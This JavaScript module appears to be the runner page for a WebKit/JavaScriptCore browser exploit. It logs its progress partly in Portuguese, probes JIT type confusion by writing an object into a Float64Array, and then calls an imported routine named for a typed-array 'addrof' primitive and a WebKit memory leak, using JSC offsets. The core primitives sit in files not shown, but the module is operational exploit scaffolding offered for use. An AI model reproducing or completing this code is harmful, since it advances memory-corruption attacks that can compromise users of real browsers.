import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE
} from './script3/testArrayBufferVictimCrash.mjs';
import { AdvancedInt64, setLogFunction, toHex, isAdvancedInt64Object } from './utils.mjs';
import { JSC_OFFSETS } from './config.mjs';


// --- Local DOM Elements Management ---
const elementsCache = {};

function getElementById(id) {
    if (elementsCache[id] && document.body.contains(elementsCache[id])) {
        return elementsCache[id];
    }
    const element = document.getElementById(id);
    if (element) {
        elementsCache[id] = element;
    }
    return element;
}

// --- Local Logging Functionality ---
const outputDivId = 'output-advanced';

export const log = (message, type = 'info', funcName = '') => {
    const outputDiv = getElementById(outputDivId);
    if (!outputDiv) {
        console.error(`Log target div "${outputDivId}" not found. Message: ${message}`);
        return;
    }
    try {
        const timestamp = `[${new Date().toLocaleTimeString()}]`;
        const prefix = funcName ? `[${funcName}] ` : '';
        const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
        const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation', 'tool', 'debug'].includes(type) ? type : 'info';

        if (outputDiv.innerHTML.length > 600000) {
            const lastPart = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 300000);
            outputDiv.innerHTML = `<span class="log-info">[${new Date().toLocaleTimeString()}] [Log Truncado...]</span>\n` + lastPart;
        }

        outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
        outputDiv.scrollTop = outputDiv.scrollHeight;
    } catch (e) {
        console.error(`Error in logToDiv for ${outputDivId}:`, e, "Original message:", message);
        if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`;
    }
};

// --- Local Pause Functionality ---
const SHORT_PAUSE = 50;
const MEDIUM_PAUSE = 500;
const LONG_PAUSE = 1000;

const PAUSE = async (ms = SHORT_PAUSE) => {
    return new Promise(resolve => setTimeout(resolve, ms));
};

// --- JIT Behavior Test ---
async function testJITBehavior() {
    log("--- Iniciando Teste de Comportamento do JIT ---", 'test', 'testJITBehavior');
    let test_buf = new ArrayBuffer(16);
    let float_view = new Float64Array(test_buf);
    let uint32_view = new Uint32Array(test_buf);
    let some_obj = { a: 1, b: 2 };

    log("Escrevendo um objeto em um Float64Array...", 'info', 'testJITBehavior');
    float_view[0] = some_obj;

    const low = uint32_view[0];
    const high = uint32_view[1];
    const leaked_val = new AdvancedInt64(low, high);

    log(`Bits lidos: high=0x${high.toString(16)}, low=0x${low.toString(16)} (Valor completo: ${leaked_val.toString(true)})`, 'leak', 'testJITBehavior');

    if (high === 0x7ff80000 && low === 0) {
        log("CONFIRMADO: O JIT converteu o objeto para NaN, como esperado.", 'good', 'testJITBehavior');
    } else {
        log("INESPERADO: O JIT não converteu para NaN. O comportamento é diferente do esperado.", 'warn', 'testJITBehavior');
    }
    log("--- Teste de Comportamento do JIT Concluído ---", 'test', 'testJITBehavior');
}


// --- Initialization Logic ---
function initializeAndRunTest() {
    const runBtn = getElementById('runIsolatedTestBtn');
    const outputDiv = getElementById('output-advanced');

    // Set the log function in utils.mjs so core_exploit.mjs can use it
    setLogFunction(log);

    if (!outputDiv) {
        console.error("DIV 'output-advanced' not found. Log will not be displayed on the page.");
    }

    if (runBtn) {
        runBtn.addEventListener('click', async () => {
            if (runBtn.disabled) return;
            runBtn.disabled = true;

            if (outputDiv) {
                outputDiv.innerHTML = ''; // Clear previous logs
            }
            console.log("Starting isolated test");
           

            try {
                // Execute JIT test first
                await testJITBehavior();
                await PAUSE(MEDIUM_PAUSE); // Pause to read JIT test log

                await executeTypedArrayVictimAddrofAndWebKitLeak_R43(log, PAUSE, JSC_OFFSETS);
            } catch (e) {
                console.error("Critical error during isolated test execution:", e);
                log(`[CRITICAL TEST ERROR] ${String(e.message).replace(/</g, "&lt;").replace(/>/g, "&gt;")}\n`, 'critical');
            } finally {
                console.log("Isolated test concluded.");
                log("Isolated test finished.\n", 'test');
                runBtn.disabled = false;
                if (document.title.includes(FNAME_MODULE) && !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK") && !document.title.includes("Confirmed")) {
                    document.title = `${FNAME_MODULE}_Done`;
                }
            }
        });
    } else {
        console.error("Button 'runIsolatedTestBtn' not found.");
    }
}

// Ensure DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeAndRunTest);
} else {
    initializeAndRunTest();
    
} 
